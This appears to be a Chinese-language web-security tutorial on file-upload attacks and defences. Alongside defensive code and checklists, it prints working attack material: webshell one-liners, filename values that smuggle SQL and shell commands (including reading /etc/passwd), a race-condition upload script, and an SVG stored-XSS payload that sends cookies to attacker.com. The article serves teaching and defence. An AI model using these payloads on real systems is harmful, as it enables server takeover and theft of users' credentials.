文件上传安全：原理、攻击与防御

安全 文件上传 Web安全
发布日期:   2026-08-06

一、文件上传的核心原理

1.1 HTTP multipart/form-data 协议

文件上传依赖 HTTP POST 请求的 multipart/form-data 编码类型。与 application/x-www-form-urlencoded 不同，它将请求体按 boundary 分割为多个部分，每个部分可以携带独立的 Content-Type 和文件名。

POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php phpinfo(); ?>
------WebKitFormBoundary7MA4YWxk--

关键点在于：filename 字段和 Content-Type 字段完全由客户端控制，服务端不能信任这两个值中的任何一个。这是文件上传安全问题的根源。

1.2 服务端处理流程

典型的服务端文件上传处理分为以下几个阶段：接收原始字节流 → 解析 multipart 结构 → 提取文件名和类型 → 执行校验逻辑 → 写入文件系统或对象存储 → 返回结果。

攻击面分布在这条链路的几乎每个环节。文件名解析阶段的绕过针对的是”校验逻辑”，内容类型伪造针对的也是”校验逻辑”，而路径穿越则同时涉及文件名解析和写入阶段。

1.3 为什么文件上传危险

文件上传的本质风险是：攻击者将恶意内容写入服务端可执行环境。一旦满足两个条件就构成完整漏洞——恶意内容被存储到了服务端，且该内容能被服务端以某种方式执行或触发。

二、攻击手段全景

2.1 文件类型绕过

2.1.1 前端校验绕过

最基础的场景。很多系统仅靠 JavaScript 的 accept 属性或文件扩展名白名单做前端拦截。攻击者只需修改请求中的 filename 扩展名即可绕过，或者直接用 Burp Suite / curl 构造请求，完全跳过前端。

# 将 .php 改为 .jpg，但内容仍是 PHP
curl -X POST http://target/upload \
  -F "file=@shell.php;type=image/jpeg;filename=shell.jpg"

2.1.2 MIME 类型伪造

HTTP 请求中每个 multipart 部分都有一个 Content-Type 字段，这个值完全由客户端填写，服务端读到的就是客户端发的原文。问题在于很多开发者用这个值来判断文件类型：

// 危险写法：直接信任客户端发来的 Content-Type
if ($_FILES['file']['type'] === 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $_FILES['file']['name']);
}

攻击者用 Burp Suite 或 curl 构造请求时，把 Content-Type 随便写：

curl -F "file=@webshell.php;type=image/jpeg" http://target/upload

服务端收到的 $_FILES['file']['type'] 就是 image/jpeg，校验通过，但实际写入磁盘的是一个 PHP 文件。本质原因是 HTTP 协议层面没有任何机制强制客户端如实声明文件类型，这只是一个建议性的请求头字段，和浏览器自动检测的真实类型无关。PHP 中 $_FILES['file']['type'] 读的就是这个值，完全不可信。

2.1.3 扩展名黑名单绕过

黑名单策略试图拦截 .php、.jsp、.exe 等危险扩展名，但几乎不可能穷举所有变体：

  • 大小写变体：.PhP、.pHp
  • 双写绕过：.pphphp（如果过滤逻辑只删除一次 .php）
  • 等价扩展名：.php3、.php5、.phtml、.phps（Apache 可配置为解析 PHP）
  • 不可见字符：shell.php （末尾空格）、shell.php.（末尾点号），Windows 会自动去除
  • .htaccess 上传：上传 .htaccess 文件让服务器将 .jpg 当 PHP 解析
# .htaccess 内容：让所有 .jpg 文件被当作 PHP 执行
AddType application/x-httpd-php .jpg

三种典型手法的原理展开：

大小写变体。 黑名单通常只列了小写的 .php，但 Windows 文件系统不区分大小写，Shell.PhP 和 shell.php 指向同一个文件。如果服务端用字符串匹配做黑名单检查但没做 toLowerCase()，PhP 就绕过了。Linux 上虽然文件系统区分大小写，但 Apache 的 AddHandler 配置也可以做成大小写不敏感匹配。

双扩展名 shell.php.jpg。 分两种情况。第一种，有些系统的校验逻辑是”看最后一个扩展名是不是在白名单里”，shell.php.jpg 的最后扩展名是 .jpg，通过了检查。但如果 Apache 配置了 AddHandler php-script .php，它会从文件名中找到 .php 并按 PHP 执行，忽略后面的 .jpg。第二种，如果校验逻辑是”文件名中是否包含 .php“，攻击者可能用 shell.php.jpg.php 来绕过——有些过滤只检查一次，替换掉第一个 .php 后还剩一个。

空字节截断 shell.php%00.jpg。 这个问题出在 C 语言层面。C 字符串以 \0（空字节）作为终止符。PHP 5.3.4 以下版本和早期 Java 的文件操作中，文件名在传递给底层 C 函数（如 fopen、stat）之前没有过滤空字节。攻击者发送 filename=shell.php%00.jpg，服务端的校验逻辑看到的是 shell.php.jpg（按字符串比较，.jpg 后缀安全），但传递给操作系统写入文件时，C 函数遇到 %00 就截断了，实际创建的文件名是 shell.php。这个漏洞在现代 PHP（5.3.4+）中已修复，但在一些老旧系统或用 JNI 调用本地库的 Java 应用中仍可能遇到。

2.1.4 Magic Number（文件头）伪造

服务端如果只检查文件前几个字节（magic number），攻击者可以在恶意文件头部插入合法的文件签名：

GIF89a
<?php phpinfo(); ?>

这样文件的前 6 个字节就是 GIF 的 magic number 47 49 46 38 39 61，能通过文件头检查。如果服务端没有进一步校验文件完整性（比如图片是否能正常解码），这种绕过就能成功。

2.1.5 条件竞争（Race Condition）

当服务端采用”先保存再删除”的策略时（先写入临时文件，检查不通过后删除），存在一个时间窗口。攻击者可以并发发送大量请求，在文件被删除之前访问它：

import threading
import requests

target = "http://target/uploads/"

def access_file():
    while True:
        r = requests.get(target + "shell.php")
        if r.status_code == 200 and "phpinfo" in r.text:
            print("Got shell!")
            break

# 上传线程
def upload_file():
    while True:
        requests.post("http://target/upload",
            files={"file": ("shell.php", b"<?php phpinfo(); ?>")})

threads = [threading.Thread(target=access_file) for _ in range(10)]
threads += [threading.Thread(target=upload_file) for _ in range(5)]
for t in threads: t.start()

2.2 路径穿越（Path Traversal）

攻击者在文件名中注入 ../ 序列，试图将文件写入 Web 根目录之外的任意位置：

filename=../../etc/cron.d/backdoor
filename=..\..\Windows\System32\cmd.exe

不同语言的路径穿越风险点不同。Java 的 File.getName() 不会自动过滤 ../，Python 的 os.path.join 遇到绝对路径会直接切换根目录。Node.js 的 path.resolve 也有类似问题。

2.3 文件名注入

文件名是用户可控的字符串。如果后端拿到文件名后不做转义就直接拼进其他操作，就会引发与上传无关的第二层漏洞。

SQL 注入场景：

$filename = $_FILES['file']['name'];  // 攻击者可控
// 假设攻击者构造 filename = "x.jpg'); DROP TABLE uploads;--"
$sql = "INSERT INTO files (filename, path) VALUES ('$filename', '$path')";
// 展开后：
// INSERT INTO files (filename, path) VALUES ('x.jpg'); DROP TABLE uploads;--', '/uploads/xxx')

数据库执行了攻击者注入的 DROP TABLE。

命令注入场景：

$filename = $_FILES['file']['name'];  // 攻击者构造: "a.jpg; cat /etc/passwd"
system("file /uploads/" . $filename);
// 展开后：
// file /uploads/a.jpg; cat /etc/passwd

shell 会把 ; 后面的内容当作第二条命令执行。

日志注入场景： 如果文件名被原样写入 access log，攻击者可以注入换行符伪造日志条目，或者注入 %s 等格式化字符串触发格式化字符串漏洞。

核心问题是：文件名被当作不可信输入，但下游代码把它当成了安全数据。

2.4 解析漏洞利用

2.4.1 Apache 多扩展名解析

Apache 默认从右向左识别扩展名，如果右侧扩展名无法识别，则向左回溯。配置 AddHandler 后，shell.php.xxx 可能被当作 PHP 执行。

2.4.2 IIS 解析漏洞

IIS 6.0 中，目录名包含 .asp 则该目录下所有文件都被当作 ASP 执行（如 /xx.asp/ 目录下的 .jpg 文件）。IIS 7.0/7.5 在 cgi.fix_pathinfo=1 时存在解析漏洞：访问 /upload/1.jpg/.php，如果 1.jpg 存在，则按 PHP 解析。

2.4.3 Nginx 解析漏洞

Nginx 的 cgi.fix_pathinfo 配置不当也会导致类似问题。此外，如果配置了 location ~ \.php$ 和 location /upload/，上传 shell.jpg 后访问 shell.jpg/.php 可能被 PHP-FPM 解析。

2.4.4 PHP 的 $_FILES 特性

PHP 在处理 multipart/form-data 时，如果存在多个同名的 file 字段，后面的值会覆盖前面的值。攻击者可以利用这个特性绕过只检查第一个文件的逻辑：

Content-Disposition: form-data; name="file"; filename="a.jpg"
Content-Type: image/jpeg
[jpeg data]

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php
[php code]

2.5 内容相关攻击

2.5.1 WebShell 上传

最终目标通常是上传一个 WebShell——一段能被服务端解释器执行的恶意代码。不同语言有不同形态：

// PHP 一句话木马
<?php @eval($_POST['cmd']); ?>

// JSP WebShell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Python (Flask debug 模式下)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

2.5.2 图片马（Polyglot）

将恶意代码嵌入图片文件的冗余数据区域（如 EXIF Comment、GIF 尾部），使其既是合法图片又是可执行脚本。配合文件包含漏洞（LFI）触发执行：

# 将 PHP 代码写入图片的 EXIF 注释
exiftool -Comment="<?php phpinfo(); ?>" image.jpg

2.5.3 二次注入 / 存储型 XSS

假设一个社交平台允许用户上传头像，且上传目录可以通过 https://www.example.com/uploads/xxx.svg 直接访问。攻击者上传一个 SVG 文件：

<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://www.example.com/api/user/info').then(r => r.json()).then(data => {
      new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
    });
  </script>
</svg>

当其他用户浏览到这个 SVG 时，浏览器会渲染它并执行其中的 JavaScript。因为 SVG 和主站在同一个域名 www.example.com 下，这段脚本能读取主站的 Cookie、调用主站的 API、以受害者的身份执行操作。

这里的关键不是上传本身有漏洞，而是 上传目录没有做域名隔离。如果上传文件放在 files.example.com 或 CDN/OSS 上，即使 SVG 里有恶意脚本，它也只能在 files.example.com 的上下文中执行，拿不到主站的 Cookie。

如果上传目录没有做独立的 Origin 隔离或 CSP 限制，这段脚本会在目标域下执行。

2.6 拒绝服务（DoS）

上传超大文件、Zip 炸弹（解压后体积指数膨胀）、或大量并发上传耗尽磁盘/连接资源。一个经典的 Zip 炸弹是 42KB 的 ZIP 文件解压后达到 4.5PB。

三、防御策略

3.1 文件名处理

核心原则：永远不要信任客户端传来的文件名。

最安全的做法是服务端生成随机文件名，仅保留原始扩展名用于类型判断：

// Java: 生成随机文件名
String originalName = file.getOriginalFilename();
String ext = FilenameUtils.getExtension(originalName);
String storedName = UUID.randomUUID().toString() + "." + ext;
Path target = uploadDir.resolve(storedName);

# Python: 使用 werkzeug 的安全文件名处理
from werkzeug.utils import secure_filename
import os, uuid

filename = secure_filename(file.filename)  # 去除路径分隔符和特殊字符
ext = os.path.splitext(filename)[1]
stored_name = f"{uuid.uuid4().hex}{ext}"

// PHP: 生成随机文件名
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$stored_name = bin2hex(random_bytes(16)) . '.' . $ext;

如果必须保留原始文件名，需要过滤 ../、..\\、空字节 %00、以及所有控制字符，并做路径规范化后验证结果路径仍在预期目录内：

Path target = uploadDir.resolve(filename).normalize();
if (!target.startsWith(uploadDir)) {
    throw new SecurityException("Path traversal detected");
}

3.2 文件类型校验（多层纵深）

单一校验手段都可以被绕过，必须多层叠加：

第一层：扩展名白名单。 白名单优于黑名单，因为可枚举的合法类型远少于需要拦截的类型。注意处理大小写、双扩展名（shell.php.jpg）、空字节截断（shell.php%00.jpg，Java/PHP 5.3 以下受影响）。

第二层：Magic Number 校验。 读取文件实际内容的前几个字节，与预期签名比对：

MAGIC_NUMBERS = {
    b'\xff\xd8\xff': 'jpg',
    b'\x89PNG': 'png',
    b'GIF87a': 'gif',
    b'GIF89a': 'gif',
    b'%PDF': 'pdf',
}

def verify_magic(file_path, expected_type):
    with open(file_path, 'rb') as f:
        header = f.read(8)
    for magic, ftype in MAGIC_NUMBERS.items():
        if header.startswith(magic) and ftype == expected_type:
            return True
    return False

// Java: 使用 Tika 做内容类型检测
Tika tika = new Tika();
String detected = tika.detect(file.getInputStream());
if (!"image/jpeg".equals(detected)) {
    throw new SecurityException("Content type mismatch");
}

第三层：内容完整性校验。 对图片文件，用图像处理库尝试解码并重新编码，验证它确实是合法图片：

from PIL import Image

def verify_image(file_path):
    try:
        img = Image.open(file_path)
        img.verify()  # 验证图片完整性
        return True
    except Exception:
        return False

第四层：MIME 类型交叉验证。 将扩展名、magic number、Content-Type 三者交叉比对，任何不一致都拒绝。

3.3 存储与执行隔离

上传目录禁止执行。 这是最关键的一道防线。即使前面所有校验都被绕过，只要上传目录不能执行脚本，攻击就无法完成。

# Apache: 上传目录禁止执行脚本
<Directory "/var/www/uploads">
    Options -ExecCGI
    RemoveHandler .php .phtml .php3 .php5
    <FilesMatch "\.(php|phtml|php3|php5|pl|py|jsp|asp|aspx)$">
        Require all denied
    </FilesMatch>
</Directory>

# Nginx: 上传目录只允许静态文件
location /uploads/ {
    location ~ \.(php|jsp|asp|aspx|py|pl)$ {
        deny all;
    }
}

使用独立的文件存储域名或 CDN。 将上传文件放在 files.example.com 或对象存储（如 S3/OSS）上，与应用主域名 www.example.com 隔离。这样即使上传了 XSS payload，也无法读取主域的 Cookie。配合 Content-Security-Policy 和独立的 Origin 进一步限制。

对象存储优先于本地文件系统。 使用 S3/OSS 等对象存储天然不存在本地文件执行的风险，且可以设置 Bucket Policy 限制 Content-Type 和公开访问范围。

3.4 文件大小与速率限制

# Flask 示例
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB 上限

# 速率限制
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["100 per minute"])

@app.route("/upload", methods=["POST"])
@limiter.limit("10 per minute")
def upload():
    ...

对压缩包必须做解压后的体积检查（防止 Zip 炸弹），设置解压倍率上限（如原始大小的 100 倍）。

3.5 防病毒扫描

对上传文件做病毒扫描，可以集成 ClamAV 等开源引擎：

// Java 集成 ClamAV
try (Socket socket = new Socket("localhost", 3310);
     OutputStream os = socket.getOutputStream();
     InputStream is = socket.getInputStream()) {
    os.write("zSCAN\n".getBytes());
    os.write(fileBytes);
    os.write("\0".getBytes());
    // 读取扫描结果
}

3.6 安全响应头

服务端返回上传文件时，设置以下响应头降低风险：

Content-Disposition: attachment; filename="downloaded-file.jpg"
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'none'; style-src 'self' 'unsafe-inline'

Content-Disposition: attachment 强制浏览器下载而非内联渲染，阻止 SVG/HTML 的 XSS 执行。nosniff 阻止浏览器 MIME 嗅探。CSP 限制文件只能加载自身资源。

四、各语言常见陷阱

4.1 Java

  • MultipartFile.getOriginalFilename() 返回的是客户端提供的原始值，不可信
  • File.renameTo() 在某些平台上不保证原子性，条件竞争场景需注意
  • Apache Commons FileUpload 旧版本存在路径穿越漏洞（CVE-2016-1000030）
  • Spring Boot 默认使用临时目录存储上传文件，需确保临时目录权限正确

4.2 PHP

  • $_FILES['file']['type'] 来自请求头，完全可伪造
  • move_uploaded_file() 是安全的上传函数，它会检查文件确实通过 HTTP POST 上传
  • getimagesize() 可以验证图片尺寸，但不能完全替代内容校验
  • PHP 5.3 以下存在空字节截断漏洞：shell.php%00.jpg 在文件系统操作中被截断为 shell.php
  • $_FILES 同名覆盖特性（同名字段后者覆盖前者）

4.3 Python

  • os.path.join(base, user_input) 如果 user_input 是绝对路径，会直接返回 user_input
  • Flask 的 secure_filename() 会剥离路径分隔符和特殊字符，但不处理 magic number
  • Django 的 FileField 默认不校验文件内容类型
  • Pillow 的 Image.verify() 只检查文件头，不保证图片完全合法；更安全的做法是打开图片后重新保存

五、完整防御清单

将防御措施按优先级排列：

  1. 上传目录禁止执行脚本（最关键，最后一道防线）
  2. 服务端生成随机文件名，不信任客户端文件名
  3. 扩展名白名单（而非黑名单）
  4. Magic Number + 内容完整性校验（图片重编码验证）
  5. 文件大小限制 + 上传速率限制
  6. 独立域名/对象存储隔离上传文件
  7. 安全响应头（Content-Disposition: attachment, nosniff, CSP）
  8. 防病毒扫描
  9. 日志记录所有上传行为（文件名、IP、时间、大小、哈希）
  10. 定期审计上传目录中的文件

六、攻击链示例：从上传到 GetShell

一个典型的完整攻击链：

  1. 发现上传接口，测试发现仅校验前端 JS 扩展名 → 直接绕过
  2. 上传 .php 文件被拦截 → 尝试 .php5 成功（黑名单不完整）
  3. 或者：上传 shell.jpg（内容是 PHP），同时上传 .htaccess（AddType application/x-httpd-php .jpg）→ 访问 shell.jpg 被当 PHP 执行
  4. 如果上传目录禁止执行 → 尝试路径穿越写到其他目录 → filename=../../app/shell.php
  5. 如果路径穿越也被防住 → 寻找文件包含漏洞（LFI）配合图片马 → 上传含 PHP 代码的图片 → 通过 include() 触发执行

这条攻击链说明：纵深防御的每一层都很重要，任何一层缺失都可能被突破。
